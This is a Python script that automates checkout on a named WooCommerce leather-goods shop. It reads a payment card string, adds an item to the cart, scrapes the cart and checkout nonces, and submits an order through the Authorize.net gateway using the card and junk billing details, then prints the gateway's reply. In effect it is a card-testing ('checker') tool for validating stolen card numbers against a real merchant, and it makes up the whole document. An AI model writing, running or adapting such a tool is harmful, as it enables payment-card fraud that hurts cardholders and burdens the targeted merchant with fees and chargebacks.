import random
import re
import names
from requests import Session
from dataclasses import dataclass

class ConfigsPAge:
    @classmethod
    def QueryText(self, data:str=None, chainOne:str=None, chainTwo:str=None):

        try:               return data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
        except ValueError: return None 

    @classmethod
    def RandomName(self, dato: str = None):
        if dato == 'email':
            self.email = "{}{}{}@gmail.com".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000, 9999999)
            )
            return self.email
        
        else:
            return 'Valores incorrectos: >>>   ConfigsPAge().RandomName("username")'

@dataclass
class avspfw1:
    def main(self, card):

            self.UseMail = ConfigsPAge().RandomName('email')
            self.card = card
            self.ccs = card.split('|')
            if self.ccs[0].startswith("4"): self.brand = "VI"
            if self.ccs[0].startswith("3"): self.brand = "AE"
            elif self.ccs[0].startswith("5"): self.brand = "MC"

            session = Session()


            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.8',
                'cache-control': 'max-age=0',
                'priority': 'u=0, i',
                'referer': 'https://grommetsleathercraft.com/product-category/ready-to-ship/?orderby=price',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-03-26%2000%3A45%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fgrommetsleathercraft.com%2Fproduct%2Ffiresteel-loop-addition%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-03-26%2000%3A45%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fgrommetsleathercraft.com%2Fproduct%2Ffiresteel-loop-addition%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36; _lb=7621359019785811000; wp_woocommerce_session_76bed13bdc15786f9874191beff39fa2=t_cbc16af35ef30e16eb549c7bca9124%7C1774658921%7C1774572521%7C%24generic%24aRj8R1P47uxsoO7wwR4aBGFGVsZrwV1pgbJTICuk; googtrans=/en/es; googtrans=/en/es; sbjs_session=pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgrommetsleathercraft.com%2Fproduct%2Fsmiths-leather-balm%2F',
            }

            response = session.get('https://grommetsleathercraft.com/product/smiths-leather-balm/', headers=headers)


            headers = {
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.8',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://grommetsleathercraft.com',
                'priority': 'u=1, i',
                'referer': 'https://grommetsleathercraft.com/product/smiths-leather-balm/',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-03-26%2000%3A45%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fgrommetsleathercraft.com%2Fproduct%2Ffiresteel-loop-addition%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-03-26%2000%3A45%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fgrommetsleathercraft.com%2Fproduct%2Ffiresteel-loop-addition%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36; _lb=7621359019785811000; wp_woocommerce_session_76bed13bdc15786f9874191beff39fa2=t_cbc16af35ef30e16eb549c7bca9124%7C1774658921%7C1774572521%7C%24generic%24aRj8R1P47uxsoO7wwR4aBGFGVsZrwV1pgbJTICuk; googtrans=/en/es; googtrans=/en/es; sbjs_session=pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgrommetsleathercraft.com%2Fproduct%2Fsmiths-leather-balm%2F',
            }

            data = {
                'attribute_pa_tin-size': '1oz',
                'quantity': '1',
                'add-to-cart': '20765',
                'product_id': '20765',
                'variation_id': '20770',
                'action': 'flatsome_ajax_add_to_cart',
            }

            response = session.post('https://grommetsleathercraft.com/wp-admin/admin-ajax.php', headers=headers, data=data).json()
            cart_h = response['cart_hash']
            print(cart_h)
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.8',
                'priority': 'u=0, i',
                'referer': 'https://grommetsleathercraft.com/product/smiths-leather-balm/',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-03-26%2000%3A45%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fgrommetsleathercraft.com%2Fproduct%2Ffiresteel-loop-addition%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-03-26%2000%3A45%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fgrommetsleathercraft.com%2Fproduct%2Ffiresteel-loop-addition%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36; _lb=7621359019785811000; wp_woocommerce_session_76bed13bdc15786f9874191beff39fa2=t_cbc16af35ef30e16eb549c7bca9124%7C1774658921%7C1774572521%7C%24generic%24aRj8R1P47uxsoO7wwR4aBGFGVsZrwV1pgbJTICuk; googtrans=/en/es; googtrans=/en/es; sbjs_session=pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgrommetsleathercraft.com%2Fproduct%2Fsmiths-leather-balm%2F; woocommerce_items_in_cart=1; woocommerce_cart_hash=8574e5168b358effe697d35a21bb02fe',
            }

            response = session.get('https://grommetsleathercraft.com/cart/', headers=headers).text
            cart = ConfigsPAge().QueryText(response, 'name="woocommerce-cart-nonce" value="', '"')
            print(cart)


            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.8',
                'priority': 'u=0, i',
                'referer': 'https://grommetsleathercraft.com/cart/',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-03-26%2000%3A45%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fgrommetsleathercraft.com%2Fproduct%2Ffiresteel-loop-addition%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-03-26%2000%3A45%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fgrommetsleathercraft.com%2Fproduct%2Ffiresteel-loop-addition%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36; _lb=7621359019785811000; wp_woocommerce_session_76bed13bdc15786f9874191beff39fa2=t_cbc16af35ef30e16eb549c7bca9124%7C1774658921%7C1774572521%7C%24generic%24aRj8R1P47uxsoO7wwR4aBGFGVsZrwV1pgbJTICuk; googtrans=/en/es; googtrans=/en/es; woocommerce_items_in_cart=1; woocommerce_cart_hash=8574e5168b358effe697d35a21bb02fe; sbjs_session=pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgrommetsleathercraft.com%2Fcart%2F',
            }

            response = session.get('https://grommetsleathercraft.com/checkout/', headers=headers).text
            checkout = ConfigsPAge().QueryText(response, 'name="woocommerce-process-checkout-nonce" value="', '"')
            print(checkout)

            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.8',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://grommetsleathercraft.com',
                'priority': 'u=1, i',
                'referer': 'https://grommetsleathercraft.com/checkout/',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-03-26%2000%3A45%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fgrommetsleathercraft.com%2Fproduct%2Ffiresteel-loop-addition%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-03-26%2000%3A45%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fgrommetsleathercraft.com%2Fproduct%2Ffiresteel-loop-addition%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; _lb=7621359019785811000; wp_woocommerce_session_76bed13bdc15786f9874191beff39fa2=t_cbc16af35ef30e16eb549c7bca9124%7C1774658921%7C1774572521%7C%24generic%24aRj8R1P47uxsoO7wwR4aBGFGVsZrwV1pgbJTICuk; googtrans=/en/es; googtrans=/en/es; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36; woocommerce_items_in_cart=1; woocommerce_cart_hash=8574e5168b358effe697d35a21bb02fe; sbjs_session=pgs%3D19%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgrommetsleathercraft.com%2Fcheckout%2F',
            }

            params = {
                'wc-ajax': 'checkout',
            }

            data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fgrommetsleathercraft.com%2Fproduct%2Ffiresteel-loop-addition%2F&wc_order_attribution_session_start_time=2026-03-26+00%3A45%3A19&wc_order_attribution_session_pages=19&wc_order_attribution_session_count=2&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F146.0.0.0+Safari%2F537.36&billing_first_name=ldfl&billing_last_name=dsdasd&billing_company=ggd&billing_country=US&billing_address_1=moall+del+sol&billing_address_2=sadw&billing_city=guayas&billing_state=NY&billing_postcode=10080&billing_phone=%2B10989861371&billing_email=banes42563%40rohoza.com&shipping_first_name=ldfl&shipping_last_name=dsdasd&shipping_company=ggd&shipping_country=US&shipping_address_1=moall+del+sol&shipping_address_2=sadw&shipping_city=guayas&shipping_state=NY&shipping_postcode=10080&order_comments=&shipping_method%5B0%5D=free_shipping%3A4&payment_method=yith_wcauthnet_credit_card_gateway&yith_wcauthnet_credit_card_gateway-card-number={self.ccs[0]}&yith_wcauthnet_credit_card_gateway-card-expiry={self.ccs[1]}+%2F+{self.ccs[2]}&yith_wcauthnet_credit_card_gateway-card-cvc={self.ccs[3]}&yith_wcauthnet_credit_card_gateway-card-type=&woocommerce-process-checkout-nonce={checkout}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'

            error = session.post('https://grommetsleathercraft.com/', params=params,  headers=headers, data=data).json()
            print(error)        


cc = input('cc: ')
chk = avspfw1().main(cc)
print(chk)     